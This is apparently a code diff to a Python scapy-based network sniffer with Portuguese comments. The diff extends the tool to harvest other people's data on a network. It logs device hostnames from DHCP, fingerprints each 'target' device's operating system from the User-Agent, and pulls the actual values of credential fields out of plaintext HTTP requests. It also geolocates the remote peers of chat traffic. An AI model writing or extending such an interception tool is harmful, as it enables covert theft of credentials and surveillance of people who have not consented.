@@ -42,6 +42,16 @@ class DSISniffer:
         return "Nuvem/CDN"
 
     def process_packet(self, packet):
+        # 0. Identificação de Hostname (DHCP)
+        if packet.haslayer(scapy.DHCP):
+            src_mac = packet[scapy.Ether].src
+            options = packet[scapy.DHCP].options
+            for opt in options:
+                if isinstance(opt, tuple) and opt[0] == 'hostname':
+                    hostname = opt[1].decode(errors='ignore')
+                    self.log(f"[DISPOSITIVO] Identificado Hostname: {hostname} (MAC: {src_mac})", log_type="info")
+                    break
+
         # 1. Identificação de Redes Sociais e Chat
         if packet.haslayer(scapy.DNSQR):
             qname = packet[scapy.DNSQR].qname.decode('utf-8').lower()
@@ -52,26 +62,33 @@ class DSISniffer:
                     break
 
         # 2. Intercepção de Tráfego P2P/Chat (Identificação de Origem Remota)
-        # Muitos chats usam STUN/UDP para chamadas ou transferências
         if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.IP):
             src_ip = packet[scapy.IP].src
             dst_ip = packet[scapy.IP].dst
-            # Se a porta for alta (típico de apps de chat), tentamos geolocalizar
             if packet[scapy.UDP].sport > 10000 or packet[scapy.UDP].dport > 10000:
-                # Evita IPs locais
                 if not dst_ip.startswith("192.168.") and not dst_ip.startswith("10."):
                     location = self.get_location(dst_ip)
                     if location != "Nuvem/CDN":
-                        self.log(f"[GEOLOCALIZAÇÃO] Mensagem/Fluxo recebido de: {location} [IP: {dst_ip}]", log_type="info")
+                        self.log(f"[GEOLOCALIZAÇÃO] Mensagem de {src_ip} vinda de: {location}", log_type="error")
 
-        # 3. Credenciais HTTP
+        # 3. Credenciais e Fingerprinting HTTP
         if packet.haslayer(http.HTTPRequest):
             src_ip = packet[scapy.IP].src
+            # Fingerprinting via User-Agent
+            ua = packet[http.HTTPRequest].User_Agent
+            if ua:
+                ua_str = ua.decode(errors='ignore')
+                os_info = "iPhone/iOS" if "iPhone" in ua_str else "Android" if "Android" in ua_str else "Windows" if "Windows" in ua_str else "Mac" if "Macintosh" in ua_str else "Linux"
+                self.log(f"[FINGERPRINT] Alvo {src_ip} está usando {os_info}", log_type="info")
+
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load.decode(errors='ignore').lower()
                 for key in self.cred_keywords:
                     if key in load:
-                        self.log(f"!!! [CREDENTIAL FOUND] Alvo: {src_ip} | Dados: {load[:100]}", log_type="error")
+                        # Extrai o valor provável (sensível)
+                        match = re.search(f"{key}=([^& ]+)", load)
+                        value = match.group(1) if match else "Oculto"
+                        self.log(f"!!! [DADO SENSÍVEL CAPTURADO] Alvo: {src_ip} | {key.upper()}: {value}", log_type="error")
                         break
 
     def start(self):
